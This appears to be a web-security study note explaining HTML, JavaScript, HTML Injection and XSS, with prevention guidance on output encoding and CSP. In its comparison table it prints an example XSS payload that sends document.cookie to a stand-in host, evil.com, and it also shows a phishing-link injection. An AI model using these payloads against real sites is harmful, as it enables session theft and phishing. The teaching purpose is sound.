# Websites — How They Work

## 🌐 Overview

Every website you visit is built from three core technologies working together:

| Layer | Technology | Role |
|-------|-----------|------|
| **Structure** | HTML | Defines the content and layout of the page |
| **Style** | CSS | Controls the visual appearance (colours, fonts, spacing) |
| **Behaviour** | JavaScript | Adds interactivity and dynamic functionality |

> When you visit a website, your browser requests the HTML file from the server, parses it, fetches any linked CSS and JavaScript files, and renders the final page you see. Understanding this structure is the foundation of web application security testing.

---

## 🏗️ HTML — HyperText Markup Language

**HTML** is the language websites are written in. It uses **elements** (tags) as building blocks — each one tells the browser how to display a piece of content. Tags are written as `<tagname>` to open and `</tagname>` to close.

### Page Structure

Every valid HTML page follows this skeleton:

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>Main Heading</h1>
        <p>A paragraph of text.</p>
    </body>
</html>
```

### Core Tags

| Tag | Purpose |
|-----|---------|
| `<!DOCTYPE html>` | Declares the document as HTML5 — tells the browser which version to use for parsing |
| `<html>` | Root element — all other elements are nested inside this |
| `<head>` | Contains page metadata — title, linked stylesheets, scripts, SEO tags |
| `<body>` | Contains all visible page content |
| `<h1>` – `<h6>` | Headings — `<h1>` is the largest/most important, `<h6>` the smallest |
| `<p>` | Paragraph of text |
| `<a href="...">` | Hyperlink — navigates to another page or resource |
| `<img src="..." alt="...">` | Embeds an image |
| `<form>` | Wraps input fields for submitting data to a server |
| `<input>` | Input field — text, password, checkbox, file, etc. |
| `<div>` | Generic block-level container for grouping elements |
| `<span>` | Generic inline container for styling portions of text |
| `<script>` | Embeds or links JavaScript |
| `<link>` | Links external resources — typically CSS stylesheets |

> **Why HTML matters for security:** HTML is parsed and rendered by the browser — if user input is written into the page without sanitisation, the browser will interpret it as markup. This is the root cause of HTML Injection and Cross-Site Scripting (XSS).

---

## ⚡ JavaScript

**JavaScript (JS)** makes web pages interactive. While HTML defines the structure and CSS defines the appearance, JavaScript controls behaviour — responding to user actions, updating content in real time, and communicating with servers without reloading the page.

### How JavaScript Is Loaded

JavaScript can be embedded directly in the page or loaded from an external file:

```html
<!-- Inline JavaScript — embedded directly in the HTML -->
<script>
    document.getElementById("demo").innerHTML = "Hello!";
</script>

<!-- External JavaScript — loaded from a separate file -->
<script src="/static/js/app.js"></script>

<!-- External JavaScript from a CDN -->
<script src="https://cdn.example.com/library.js"></script>
```

### What JavaScript Can Do

| Capability | Description |
|-----------|-------------|
| **DOM manipulation** | Dynamically read and modify the HTML and CSS of a page in real time |
| **Event handling** | Respond to user actions — clicks, keypresses, form submissions |
| **AJAX / Fetch** | Send and receive data from a server in the background without page reloads |
| **Cookie access** | Read and write cookies via `document.cookie` (unless `HttpOnly` is set) |
| **Local storage** | Store data persistently in the browser via `localStorage` / `sessionStorage` |
| **Form validation** | Validate input client-side before submission |

> **Security note:** JavaScript runs in the browser — it is fully visible and modifiable by the user. Never trust client-side validation alone. Any security control enforced only in JavaScript (input validation, access checks, price calculations) can be bypassed by modifying the JS or sending requests directly to the server. All validation must be duplicated server-side.

> **XSS:** If an attacker can inject JavaScript into a page that other users load, they can steal cookies (`document.cookie`), capture keystrokes, redirect users, or perform actions on their behalf. This is Cross-Site Scripting (XSS) — the most common web vulnerability class.

---

## 💉 HTML Injection

**HTML Injection** occurs when user input is written directly into the page without being sanitised — the browser interprets the input as HTML markup rather than plain text.

> **Root cause:** The application fails to sanitise user input — it takes whatever the user submits and writes it into the page source as-is. The browser then parses and renders it as real HTML.

### How It Works

```
Normal input:    Hello, world!
Rendered as:     Hello, world!   ← plain text, safe

Injected input:  <h1>Hacked</h1>
Rendered as:     [large heading saying "Hacked"]   ← interpreted as HTML
```

### Attack Flow

```
1. Attacker submits malicious HTML as input
   e.g. <h1>You have been hacked</h1><a href="http://evil.com">Click here</a>

2. Application writes the input directly into the page without sanitising it

3. Browser renders the attacker's HTML as real content

4. Other users see the injected content as if it were part of the legitimate site
```

### HTML Injection vs XSS

| | HTML Injection | XSS (Cross-Site Scripting) |
|-|---------------|---------------------------|
| **Injects** | HTML markup | JavaScript code |
| **Impact** | Page defacement, phishing links, fake forms | Cookie theft, session hijacking, keylogging, full account takeover |
| **Payload** | `<h1>Hacked</h1>` | `<script>document.location='http://evil.com?c='+document.cookie</script>` |
| **Severity** | Medium | High / Critical |

> HTML Injection and XSS share the same root cause — unfiltered user input rendered in the browser. XSS is HTML Injection that executes JavaScript. If an application is vulnerable to HTML Injection, it is likely also vulnerable to XSS.

### Prevention

| Method | Description |
|--------|-------------|
| **Output encoding** | Encode special characters before writing them into the page — `<` becomes `&lt;`, `>` becomes `&gt;` — the browser displays them as text rather than parsing them as tags |
| **Input sanitisation** | Strip or reject dangerous characters and tags from user input on the server side |
| **Content Security Policy (CSP)** | HTTP response header that restricts which scripts and content sources the browser will execute — limits the impact of successful injection |
| **Template engines with auto-escaping** | Modern frameworks (Django, React, Jinja2) escape output by default — only disable escaping when you explicitly intend to render HTML |

> **Never trust user input.** Any data coming from outside the server — form fields, URL parameters, cookies, HTTP headers — must be treated as untrusted and encoded before being written into a page.
